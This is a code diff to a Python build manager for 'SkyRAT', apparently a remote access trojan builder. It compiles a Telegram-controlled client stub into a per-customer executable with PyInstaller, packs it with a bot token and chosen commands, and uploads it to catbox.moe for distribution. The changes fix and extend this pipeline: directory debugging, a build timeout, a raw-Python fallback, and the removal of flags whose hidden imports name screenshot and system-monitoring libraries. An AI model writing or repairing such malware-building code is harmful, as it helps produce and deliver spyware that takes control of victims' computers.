@@ -67,15 +67,32 @@ class BuildManager:
             build_result = await self.run_pyinstaller(build_path, auth_token)
 
             if build_result["success"]:
-                # Check if executable was created
-                exe_path = build_path / "dist" / f"SkyRAT_{auth_token}.exe"
-                if exe_path.exists():
-                    file_size = exe_path.stat().st_size
-                    logger.info(f"Build successful! Executable size: {file_size} bytes")
+                # Debug: List all files in dist directory
+                dist_path = build_path / "dist"
+                if dist_path.exists():
+                    logger.info(f"Files in dist directory:")
+                    for file in dist_path.iterdir():
+                        logger.info(f"  - {file.name} ({file.stat().st_size} bytes)")
+                else:
+                    logger.error(f"Dist directory doesn't exist: {dist_path}")
 
-                    # Create zip file for upload (catbox.moe doesn't allow .exe files)
+                # Check for any executable files
+                possible_files = []
+                if dist_path.exists():
+                    # Look for any files in dist directory
+                    for file in dist_path.iterdir():
+                        if file.is_file():
+                            possible_files.append(file)
+
+                if possible_files:
+                    # Use the first file found (likely the executable)
+                    file_path = possible_files[0]
+                    file_size = file_path.stat().st_size
+                    logger.info(f"Using file: {file_path.name} ({file_size} bytes)")
+
+                    # Create zip file for upload
                     zip_path = build_path / "dist" / f"SkyRAT_{auth_token}.zip"
-                    zip_result = self.create_zip_file(exe_path, zip_path, auth_token, bot_token, enabled_commands)
+                    zip_result = self.create_zip_file(file_path, zip_path, auth_token, bot_token, enabled_commands)
 
                     if zip_result["success"]:
                         # Upload zip to catbox.moe
@@ -105,9 +122,10 @@ class BuildManager:
                             "error": f"Zip creation failed: {zip_result['error']}"
                         }
                 else:
+                    logger.error("No files found in dist directory after build")
                     return {
                         "success": False,
-                        "error": "Executable not found after build"
+                        "error": "No files found after build - PyInstaller may have failed silently"
                     }
             else:
                 return {
@@ -336,22 +354,15 @@ exe = EXE(
             if not client_stub.exists():
                 return {"success": False, "error": f"Client stub not found: {client_stub}"}
 
+            # Simplified command for better compatibility on Render
             cmd = [
                 "python", "-m", "PyInstaller",
                 "--onefile",
-                "--noconsole",
                 "--clean",
                 "--noconfirm",
-                "--icon=NONE",
                 "--distpath", str(abs_dist_path),
                 "--workpath", str(abs_work_path),
                 "--name", f"SkyRAT_{auth_token}",
-                "--hidden-import", "telegram",
-                "--hidden-import", "telegram.ext",
-                "--hidden-import", "PIL",
-                "--hidden-import", "PIL.ImageGrab",
-                "--hidden-import", "requests",
-                "--hidden-import", "psutil",
                 str(client_stub)
             ]
 
@@ -369,7 +380,16 @@ exe = EXE(
                 stderr=asyncio.subprocess.PIPE
             )
 
-            stdout, stderr = await process.communicate()
+            # Add timeout to prevent hanging
+            try:
+                stdout, stderr = await asyncio.wait_for(
+                    process.communicate(),
+                    timeout=300  # 5 minutes timeout
+                )
+            except asyncio.TimeoutError:
+                process.kill()
+                await process.wait()
+                return {"success": False, "error": "PyInstaller build timed out after 5 minutes"}
 
             stdout_text = stdout.decode() if stdout else ""
             stderr_text = stderr.decode() if stderr else ""
@@ -384,11 +404,42 @@ exe = EXE(
             else:
                 error_msg = stderr_text or "Unknown PyInstaller error"
                 logger.error(f"PyInstaller failed with return code {process.returncode}: {error_msg}")
-                return {"success": False, "error": error_msg}
+
+                # Try fallback: create a simple Python script instead of executable
+                logger.info("Attempting fallback: creating Python script instead of executable")
+                return await self.create_python_fallback(build_path, auth_token)
 
         except Exception as e:
             logger.error(f"PyInstaller execution error: {e}")
-            return {"success": False, "error": str(e)}
+            # Try fallback on exception
+            logger.info("Attempting fallback due to PyInstaller exception")
+            return await self.create_python_fallback(build_path, auth_token)
+
+    async def create_python_fallback(self, build_path: Path, auth_token: str) -> Dict:
+        """Create a Python script fallback when PyInstaller fails"""
+        try:
+            logger.info("Creating Python script fallback")
+
+            # Create dist directory
+            dist_path = build_path / "dist"
+            dist_path.mkdir(exist_ok=True)
+
+            # Copy the client stub as a .py file
+            client_stub = build_path / "client_stub.py"
+            fallback_file = dist_path / f"SkyRAT_{auth_token}.py"
+
+            if client_stub.exists():
+                import shutil
+                shutil.copy2(client_stub, fallback_file)
+
+                logger.info(f"Created Python fallback: {fallback_file}")
+                return {"success": True, "output": "Python fallback created successfully"}
+            else:
+                return {"success": False, "error": "Client stub not found for fallback"}
+
+        except Exception as e:
+            logger.error(f"Fallback creation error: {e}")
+            return {"success": False, "error": f"Fallback failed: {str(e)}"}
             
     async def upload_to_catbox(self, file_path: Path) -> Dict:
         """Upload file to catbox.moe"""
